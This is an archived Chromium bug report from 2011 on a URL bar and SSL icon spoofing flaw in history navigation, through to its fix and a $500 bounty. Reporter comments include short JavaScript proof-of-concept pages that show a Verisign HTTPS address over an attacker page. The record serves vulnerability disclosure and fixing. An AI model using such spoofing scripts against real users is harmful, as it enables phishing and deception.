# Possible URL Bar Spoofing when history.forward() is ignored using forward button

| Field | Value |
|-------|-------|
| **Issue ID** | [40092715](https://issues.chromium.org/issues/40092715) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals, UI>Browser>Navigation |
| **Reporter** | jc...@gmail.com |
| **Assignee** | cr...@chromium.org |
| **Created** | 2011-07-17 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

In some cases,after some window.location='attacker' that are used, history.forward() can be ignored.  

If the user goes forward on google chrome manually,opens and closes a new tab, Location bar is spoofed (view ScreenShot).

At this point history.forward works only manualy ( we can't use JavaScript for this ), we can just use window.open after the user goes forward ( not demonstrated yet in the testcase).  

/!\ ( For the instant, go forward manualy and open/close a new tab for enable the spoofing )

<https://crbug.com/chromium/86758(UNPATCHED)> is a lot similare to this vulnerability, but i think that this bug is a different vulnerability!

**VERSION**  

Chrome Version: [14.0.794.0] + [stable, beta, or dev]  

Operating System: [Windows 7]

**REPRODUCTION CASE**  

View Testcase1.html with Attacker.html

## Attachments

- [attacker.html](attachments/attacker.html) (text/plain; charset=us-ascii, 233 B)
- [testcase1.html](attachments/testcase1.html) (text/x-c++; charset=us-ascii, 624 B)
- [ScreenShot Chrome Spoof 14-3.png](attachments/ScreenShot Chrome Spoof 14-3.png) (image/png; charset=binary, 59.9 KB)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- [attacker.html](attachments/attacker_53317374.html) (text/plain; charset=us-ascii, 261 B)
- [testcase1.html](attachments/testcase1_53317375.html) (text/plain; charset=us-ascii, 405 B)
- [screenshot3.png](attachments/screenshot3.png) (image/png; charset=binary, 51.9 KB)

## Timeline

### ts...@chromium.org (2011-07-18)

Creis, can you determine whether this dupes 86578?  Thanks.

### ts...@chromium.org (2011-07-18)

[Empty comment from Monorail migration]

### cr...@chromium.org (2011-07-18)

Hmm.  It looks like a dupe of https://crbug.com/chromium/86758 to me, and I can't repro it in a Linux build with r92748 (even without the WebKit patch).  However, I can still occasionally repro it in the Mac Canary (14.0.825.0), which should have r92748.

It's still likely this will be fixed by the pending WebKit patch for https://crbug.com/chromium/86758.  I'll let you know if I can confirm it.  (It's tough to confirm it's gone because the repro only happens every now and then in the testcase.)

### cr...@chromium.org (2011-07-21)

My WebKit patch doesn't seem to fix this one, so I'll investigate further.  In my testing, I'm seeing two issues:

One issue is that clicking forward starts the throbber but the navigation never commits.  I never see the URL itself change, though the screenshot originally attached to the bug suggests it's possible for that to happen.

The second issue is that the SSL/EV icon in the location bar updates earlier than the URL.  That's really bad-- we shouldn't change the SSL/EV icon until the navigation commits, but we're changing it when we start navigating back/forward.  (Combined with the first issue, that means we'll show Verisign's icon even though we never commit the navigation.)

I'll keep looking to see what's causing the navigation to fail.  Adam, do you know which code updates the SSL/EV icon?

### sc...@gmail.com (2011-07-26)

I'm also curious if your recent changes affect this bug at all? Does the "kill renderer" code path get triggered by this misbehaviour?

### cr...@chromium.org (2011-07-26)

I think http://src.chromium.org/viewvc/chrome?view=rev&revision=93828 should prevent the URL spoof aspect of this (which I was never able to replicate), but probably not the SSL/EV icon spoof.  I'll try to confirm tomorrow when I get a chance.

I think it'll be worthwhile to update the SSL/EV icon behavior to keep it in sync with the URL.

### jc...@gmail.com (2011-07-26)

I've coded a more simpler Test (using Back manually + open/close a new tab).

### jc...@gmail.com (2011-07-27)

A small error in the last testcase posted (sorry).


### cr...@chromium.org (2011-07-28)

For the test case in https://crbug.com/chromium/89564#c8, can you explain what you see and what you expect to see?  It's inconsistent for me and I'm not sure what I'm looking for.  Thanks!

### jc...@gmail.com (2011-07-28)

The test case in https://crbug.com/chromium/89564#c8 don't work with you?
It spoofs SSL/TLS with a back manually and after it spoofs the address with open/close a new tab manually.

This testcase works better than the first testcase for me.

I think know why this testcase don't work perfectly with you . please try this :
TESTCASE1.HTML
<script>
var w = null;
function spoof() {
  w = window.open("about:blank");

  w.location = "https://trustsealinfo.verisign.com/splash?form_file=fdf/splash.fdf&dn=www.verisign.fr&lang=fr";

  setTimeout('w.location = "attacker.html"', 3000);

  setTimeout('w.history.back(); setTimeout("w.location = \'attacker.html\'", 0);', 4000);

}
</script>

<a href="javascript:spoof();">Click Me</a>

------
Attacker.html
<div id="layer1" style="width:598px; height:400px; position:absolute; left:10px; top:0px; z-index:1;">
    <img src="http://www.alternativ-testing.fr/hand01_up.gif" width="26" height="32" border="0"><br><h1>1=> BACK ME <br>2=> OPEN/CLOSE A NEW TAB</h1>
</div>
------

Let me know if the problem persist

### jc...@gmail.com (2011-07-28)

[Comment Deleted]

### jc...@gmail.com (2011-07-28)

Or try this:

TESTCASE1.html

<script>
var w = null;
function spoof() {

  w = window.open("about:blank");

  w.location = "attacker.html";

  setTimeout('w.location = "https://trustsealinfo.verisign.com/splash?form_file=fdf/splash.fdf&dn=www.verisign.fr&lang=fr"', 1000);

  setTimeout('w.history.back();', 3000);

  setTimeout('w.history.forward(); setTimeout("w.location = \'attacker.html\'", 0);', 4100);

}

</script>

<a href="javascript:spoof();">Click Me</a>
---
Attacker.html

<h1>1=> FORWARD ME <br>2=> OPEN/CLOSE A NEW TAB</h1>

This testcase works perfectly ( like the testcase in Introduction )!

### jc...@gmail.com (2011-07-30)

@creis : http://src.chromium.org/viewvc/chrome?view=rev&revision=93828 don't prevent the URL spoof aspect of this.
Tested with Google Chrome 14.0.835.8

### cr...@chromium.org (2011-08-01)

Thanks for the update.  I can now repro with both the original and new test cases, and I see that the URL spoof requires switching away to another tab in the same window and coming back.

Looks like the pending entry is getting changed to the SSL page but we never finish the navigation.

### jc...@gmail.com (2011-08-29)

@creis : It would be nice if this vulnerability would be fixed on the same update of 86758. :)

### cr...@chromium.org (2011-08-29)

Sorry for the delay on this one-- I'll take another look at it this afternoon.

### cr...@chromium.org (2011-08-29)

Ok, here's my summary of the problem.

The security-relevant part is that the URL bar and SSL icon are being updated at the wrong times.  I've tested Chrome, Safari, and Firefox, and no one seems to get this "right" (or even consistent).  My best guess for the "ideal behavior" is this:

(1) When a new URL is entered into the URL bar (e.g., typing, bookmark, etc), the URL bar and SSL icon should be immediately updated for the new URL.  (Switching away to another tab and coming back should not affect this.)  Even though the URL bar and icon don't match the visible page until the new navigation commits, it reflects the user's intention to go to the new page.  Besides, it'd be weird if the URL you just typed disappeared when you hit enter.

Chrome behaves this way.  Safari updates the URL but not the SSL icon, unless you switch tabs and come back (buggy).  Firefox updates the URL but not the SSL icon, even if you switch tabs and come back (buggy).


2. When a back or forward to an existing entry happens, the URL bar and SSL icon should *not* be updated until the new entry commits.  (Again, switching away to another tab and coming back should not affect this.)  Otherwise it looks like the currently visible page belongs to the wrong URL, and it allows a spoof if the navigation never commits.

Chrome gets this wrong-- the URL bar and icon update if you switch to another tab and come back, but they shouldn't update until commit.  Safari updates the URL bar right away and the icon as well if you switch away and come back (buggy).  Firefox gets it right and doesn't update anything until the commit.


The back/forward buttons are another aspect of this, but I'm not sure what the correct behavior is.  For new navigations, they obviously shouldn't update until commit, and Chrome/Safari/Firefox all agree.  Chrome and Firefox seem to think that they shouldn't update for back/forward navigations until commit, though Chrome gets it wrong if you switch tabs and come back.  Safari disagrees and updates back/forward buttons immediately if you go back or forward.  I can see the argument for that, but I don't think it matters for security.

Finally, Chrome does have a bug where the forward navigation is never committing in this test case, which allows the URL bar and SSL icon bugs to be exploited as a URL spoof.  That's important to fix as well, but it's not security-critical if we fix the URL bar and SSL icon behavior.

### bu...@chromium.org (2011-08-30)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=98853

------------------------------------------------------------------------
r98853 | creis@chromium.org | Tue Aug 30 12:01:19 PDT 2011

Changed paths:
 M http://src.chromium.org/viewvc/chrome/trunk/src/content/browser/tab_contents/navigation_controller.cc?r1=98853&r2=98852&pathrev=98853
 M http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/ui/toolbar/toolbar_model.cc?r1=98853&r2=98852&pathrev=98853
 M http://src.chromium.org/viewvc/chrome/trunk/src/content/browser/tab_contents/navigation_controller_unittest.cc?r1=98853&r2=98852&pathrev=98853
 M http://src.chromium.org/viewvc/chrome/trunk/src/content/browser/tab_contents/navigation_controller.h?r1=98853&r2=98852&pathrev=98853

Don't update URL bar or SSL icon for pending history navs until they commit.

BUG=89564
TEST=Go back or forward to a slow URL.  No omnibox change until it commits.


Review URL: http://codereview.chromium.org/7790018
------------------------------------------------------------------------

### ts...@chromium.org (2011-08-30)

Setting severity medium due to the interaction required.

### cr...@chromium.org (2011-08-30)

The security-relevant fix (as described in https://crbug.com/chromium/89564#c17) has landed in r98853.

I've filed https://crbug.com/chromium/94747 for the back button update issue, and I've filed https://crbug.com/chromium/94787 for the forward navigation that never completes (which is no longer a security issue).

The fix I've landed seems reasonably safe to merge to M14-- Jason, should I go ahead with it or wait for a canary build?

### sc...@gmail.com (2011-08-30)

[Empty comment from Monorail migration]

### ke...@google.com (2011-08-30)

Let's wait.

### jc...@gmail.com (2011-08-31)

Fixed on a Beta ?

@kerz : Why "Status:Started" after "Status:FixUnreleased" ?

### sc...@gmail.com (2011-08-31)

@kerz is IMHO misusing statuses :P I'll have a work with him.
@kerz: if you want to see what hasn't been merged yet for security, you can simply search on:
Merge=Approved Type=Security Mstone=BLAH

@creis: canary is OK? I'll merge this today.


### cr...@chromium.org (2011-08-31)

I just tested in the canary (15.0.867.0) and the URL spoof is no longer present, as expected.

### bu...@chromium.org (2011-08-31)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=99061

------------------------------------------------------------------------
r99061 | cevans@chromium.org | Wed Aug 31 15:32:26 PDT 2011

Changed paths:
 M http://src.chromium.org/viewvc/chrome/branches/835/src/content/browser/tab_contents/navigation_controller_unittest.cc?r1=99061&r2=99060&pathrev=99061
 M http://src.chromium.org/viewvc/chrome/branches/835/src/content/browser/tab_contents/navigation_controller.h?r1=99061&r2=99060&pathrev=99061
 M http://src.chromium.org/viewvc/chrome/branches/835/src/content/browser/tab_contents/navigation_controller.cc?r1=99061&r2=99060&pathrev=99061
 M http://src.chromium.org/viewvc/chrome/branches/835/src/chrome/browser/ui/toolbar/toolbar_model.cc?r1=99061&r2=99060&pathrev=99061

Merge 98853 - Don't update URL bar or SSL icon for pending history navs until they commit.

BUG=89564
TEST=Go back or forward to a slow URL.  No omnibox change until it commits.


Review URL: http://codereview.chromium.org/7790018

TBR=creis@chromium.org
Review URL: http://codereview.chromium.org/7817011
------------------------------------------------------------------------

### sc...@gmail.com (2011-08-31)

Ok, reward panel to cover this one in the next batch.

### sc...@gmail.com (2011-08-31)

[Empty comment from Monorail migration]

### jc...@gmail.com (2011-08-31)

[Comment Deleted]

### jc...@gmail.com (2011-09-02)

Fixed on 14.0.835.126 beta. :)

### jc...@gmail.com (2011-09-02)

The SSL/TLS spoofing works with just the forward button clicked by the user ( can't be automated ), but after, we can show the URL spoofing by a first alert on the first webpage of exploitation (testcase1.html for example) , and later, a second alert on the final attacker page for show the URL spoofing ( can be automated after the user goes forward or back manually ).
For demonstrate this, I can send you a new testcase.
So this vulnerability has a high impact except it works only with user interaction.

### sc...@gmail.com (2011-09-08)

Nice bug Jordi. Although ranked Medium severity due to the user interaction, certainly worth a $500 Chromium Security Reward.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-09-09)

[Empty comment from Monorail migration]

### jc...@gmail.com (2011-09-14)

Have you an idea of the release date?

### jc...@gmail.com (2011-09-17)

The release is done ! 
Now the fix is released , i think i can write a small blog-post without PoC.
let me know if you want delete of my blog post (without PoC).

### jc...@gmail.com (2011-09-19)

I would like thank you again very much for this reward !

Have you an idea of the transfer date?

### jc...@gmail.com (2011-09-22)

why nobody reply?

I would like know when the transfer is done?

Best regards.

### sc...@gmail.com (2011-09-23)

Jordi, why the terrible hurry on this one? We've never failed to start the transfer process promptly. Please, you don't have to ping repeatedly on bugs and/or e-mail us.

### sc...@gmail.com (2011-09-23)

Payment in system! Please reply quickly!

### jc...@gmail.com (2011-09-28)

Sorry but i need money ...

### jc...@gmail.com (2011-10-02)

Two week after the update , but i haven't receive my reward of 500$ on my account.

Sorry of the hurry of this one but i would like know if the transfer is done ?

A problem on the wire-transfer?

Sorry but i need money

### js...@chromium.org (2011-10-05)

Batch update.

### sc...@gmail.com (2011-10-05)

Doesn't it normally take a couple of weeks? It hasn't been a couple of weeks since Sep 23rd. Sorry, I don't have the power to speed up the international banking system :(

### sc...@gmail.com (2011-10-05)

I had a more detailed look for you, Jordi. Looks like the wire went out 10/04/2011, i.e. yesterday. I'm curious what date it will arrive in your account, so I can see how much of the latency is our internal system, vs. international wires :)

### jc...@gmail.com (2011-10-12)

Thank you very much ! I've received the reward, the last weekend on my account ! THANK YOU VERY MUCH GOOGLE !!!! :D

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-29)

[Empty comment from Monorail migration]

### is...@google.com (2018-07-29)

This issue was migrated from crbug.com/chromium/89564?no_tracker_redirect=1

[Multiple monorail components: Internals, UI>Browser>Navigation]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092715)*
